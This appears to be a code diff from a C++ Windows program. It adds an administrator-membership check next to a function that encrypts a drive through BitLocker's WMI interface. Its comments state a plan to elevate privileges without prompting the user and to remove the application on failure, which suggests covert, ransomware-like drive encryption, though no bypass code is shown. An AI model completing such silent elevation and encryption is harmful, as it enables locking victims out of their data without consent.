@@ -19,6 +19,32 @@ or attempt to enable it and continue.
 #include <wbemidl.h>
 #include <cstdio> // to remove application if it fails
 #pragma comment(lib, "wbemuuid.lib")
+#include <security.h>
+#include <shlobj.h>
+
+// Check admin rights
+bool IsUserAdmin() {
+    BOOL isAdmin = FALSE;
+    PSID adminGroup = NULL;
+    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY; // Define the authority for the SID
+
+    // Create a SID for the Administrators group
+    if (AllocateAndInitializeSid(
+        &ntAuthority, 
+        2, 
+        SECURITY_BUILTIN_DOMAIN_RID, 
+        DOMAIN_ALIAS_RID_ADMINS, 
+        0, 0, 0, 0, 0, 0, 
+        &adminGroup)) {
+            // Check if the current user is a member of the Administrators group
+            if (!CheckTokenMembership(NULL, adminGroup, &isAdmin)) {
+                isAdmin = FALSE;
+            }
+            FreeSid(adminGroup);
+        }
+    return isAdmin;
+}
+
 
 void EncryptDrive(const std::wstring& driveLetter) {
     HRESULT hres;
@@ -104,6 +130,7 @@ void EncryptDrive(const std::wstring& driveLetter) {
     } // essentially, this will allow the server to impersonate the client and take on the security context of the client.
     // If the client is administrator, the server will also be able to perform administrative tasks.
     // Therefore, the next step is to check if the user is an administrator, and if not, attempt to elevate, WITHOUT prompting the user.
+
     // Get the EncryptableVolume object for the specified drive.
     std::wstring query = L"SELECT * FROM Win32_EncryptableVolume WHERE DriveLetter = '" + driveLetter + L":\\'";
     IEnumWbemClassObject* pEnumerator = NULL;
